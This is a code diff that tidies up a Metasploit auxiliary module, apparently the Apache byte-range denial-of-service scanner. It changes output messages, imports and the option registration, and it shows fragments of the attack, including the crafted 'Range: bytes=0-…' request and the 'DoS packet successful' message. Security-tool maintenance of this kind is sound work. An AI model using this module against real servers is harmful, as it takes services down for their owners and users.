@@ -1,14 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::WmapScanFile
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Dos
@@ -50,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(80),
         OptString.new('URI', [ true,  "The request URI", '/']),
         OptInt.new('RLIMIT', [ true,  "Number of requests to send",50])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -116,11 +112,11 @@ class MetasploitModule < Msf::Auxiliary
             "Range" => "bytes=0-#{ranges}"}},1)
 
       rescue ::Rex::ConnectionRefused
-        print_status("Unable to connect to #{rhost}:#{rport}.")
+        print_error("Unable to connect to #{rhost}:#{rport}")
       rescue ::Errno::ECONNRESET
-        print_status("DoS packet successful. #{rhost} not responding.")
+        print_good("DoS packet successful. #{rhost} not responding.")
       rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-        print_status("Couldn't connect to #{rhost}:#{rport}")
+        print_error("Couldn't connect to #{rhost}:#{rport}")
       rescue ::Timeout::Error, ::Errno::EPIPE
       end
     end
